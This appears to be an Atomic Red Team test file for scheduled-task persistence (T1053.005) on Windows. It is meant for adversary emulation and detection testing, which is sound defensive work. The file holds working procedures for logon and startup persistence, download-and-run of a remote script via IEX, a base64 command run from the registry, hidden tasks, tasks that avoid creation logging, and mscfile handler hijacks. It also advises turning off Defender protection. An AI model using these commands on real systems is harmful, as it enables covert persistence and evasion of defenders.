{
  "attack_technique": "T1053.005",
  "display_name": "Scheduled Task/Job: Scheduled Task",
  "atomic_tests": [
    {
      "name": "Scheduled Task Startup Script",
      "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1",
        "procedure": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
      },
      "input_arguments": [],
      "auto_generated_guid": "fec27f65-db86-4c2d-b66c-61945aee87c2"
    },
    {
      "name": "Scheduled task Local",
      "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1",
        "procedure": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}"
      },
      "input_arguments": [
        {
          "arg_name": "task_command",
          "description": "What you want to execute",
          "type": "string",
          "default": "C:\\windows\\system32\\cmd.exe"
        },
        {
          "arg_name": "time",
          "description": "What time 24 Hour",
          "type": "string",
          "default": "20:10"
        }
      ],
      "auto_generated_guid": "42f53695-ad4a-4546-abb6-7d837f644a71"
    },
    {
      "name": "Scheduled task Remote",
      "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" /F >nul 2>&1",
        "procedure": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}"
      },
      "input_arguments": [
        {
          "arg_name": "task_command",
          "description": "What you want to execute",
          "type": "string",
          "default": "C:\\windows\\system32\\cmd.exe"
        },
        {
          "arg_name": "time",
          "description": "What time 24 Hour",
          "type": "string",
          "default": "20:10"
        },
        {
          "arg_name": "target",
          "description": "Target",
          "type": "string",
          "default": "localhost"
        },
        {
          "arg_name": "user_name",
          "description": "Username to authenticate with, format: DOMAIN\\User",
          "type": "string",
          "default": "DOMAIN\\user"
        },
        {
          "arg_name": "password",
          "description": "Password to authenticate with",
          "type": "string",
          "default": "At0micStrong"
        }
      ],
      "auto_generated_guid": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd"
    },
    {
      "name": "Powershell Cmdlet Scheduled Task",
      "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1",
        "procedure": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object"
      },
      "input_arguments": [],
      "auto_generated_guid": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd"
    },
    {
      "name": "Task Scheduler via VBA",
      "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false",
        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\""
      },
      "input_arguments": [
        {
          "arg_name": "ms_product",
          "description": "Maldoc application Word",
          "type": "string",
          "default": "Word"
        }
      ],
      "dependencies": [
        {
          "description": "Microsoft #{ms_product} must be installed",
          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
        }
      ],
      "auto_generated_guid": "ecd3fa21-7792-41a2-8726-2c5c673414d3"
    },
    {
      "name": "WMI Invoke-CimMethod Scheduled Task",
      "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1",
        "procedure": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
      },
      "input_arguments": [
        {
          "arg_name": "xml_path",
          "description": "path of vbs to use when creating masquerading files",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml"
        }
      ],
      "dependencies": [
        {
          "description": "File to copy must exist on disk at specified location (#{xml_path})",
          "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"#{xml_path}\""
        }
      ],
      "auto_generated_guid": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b"
    },
    {
      "name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
      "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "cleanup_command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1",
        "procedure": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}"
      },
      "input_arguments": [
        {
          "arg_name": "time",
          "description": "Daily scheduled task execution time",
          "type": "string",
          "default": "07:45"
        }
      ],
      "auto_generated_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba"
    },
    {
      "name": "Import XML Schedule Task with Hidden Attribute",
      "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1",
        "procedure": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
      },
      "input_arguments": [
        {
          "arg_name": "xml_path",
          "description": "path of vbs to use when creating masquerading files",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
        }
      ],
      "dependencies": [
        {
          "description": "File to copy must exist on disk at specified location (#{xml_path})",
          "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"#{xml_path}\""
        }
      ],
      "auto_generated_guid": "cd925593-fbb4-486d-8def-16cbdf944bf4"
    },
    {
      "name": "PowerShell Modify A Scheduled Task",
      "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1",
        "procedure": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction"
      },
      "input_arguments": [],
      "auto_generated_guid": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d"
    },
    {
      "name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
      "description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} > nul",
        "procedure": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon"
      },
      "input_arguments": [
        {
          "arg_name": "task_name",
          "description": "Name of the newly-added task",
          "type": "string",
          "default": "lilghostie"
        },
        {
          "arg_name": "task_command",
          "description": "Command you want the task to execute",
          "type": "string",
          "default": "notepad.exe"
        },
        {
          "arg_name": "target",
          "description": "System where the task should run",
          "type": "string",
          "default": "localhost"
        },
        {
          "arg_name": "user_name",
          "description": "Username to authenticate with, such as ATOMICDOMAIN\\AtomicAdmin",
          "type": "string",
          "default": "$env:USERDOMAIN + '\\' + $env:USERNAME"
        }
      ],
      "dependencies": [
        {
          "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory",
          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force"
        },
        {
          "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`",
          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\""
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "704333ca-cc12-4bcf-9916-101844881f54"
    },
    {
      "name": "Scheduled Task Persistence via CompMgmt.msc",
      "description": "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F",
        "procedure": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc"
      },
      "input_arguments": [
        {
          "arg_name": "task_name",
          "description": "Name of the newly-created scheduled task",
          "type": "string",
          "default": "CompMgmtBypass"
        },
        {
          "arg_name": "payload",
          "description": "Command you want the task to execute",
          "type": "string",
          "default": "calc.exe"
        }
      ],
      "auto_generated_guid": "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2"
    },
    {
      "name": "Scheduled Task Persistence via Eventviewer.msc",
      "description": "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\nWhen the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`).",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F",
        "procedure": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's run the schedule task ...\nschtasks /Run /TN \"EventViewerBypass\""
      },
      "input_arguments": [
        {
          "arg_name": "task_name",
          "description": "Name of the newly-created scheduled task",
          "type": "string",
          "default": "EventViewerBypass"
        },
        {
          "arg_name": "payload",
          "description": "Command you want the task to execute",
          "type": "string",
          "default": "calc.exe"
        }
      ],
      "auto_generated_guid": "02124c37-767e-4b76-9383-c9fc366d9d4c"
    }
  ]
}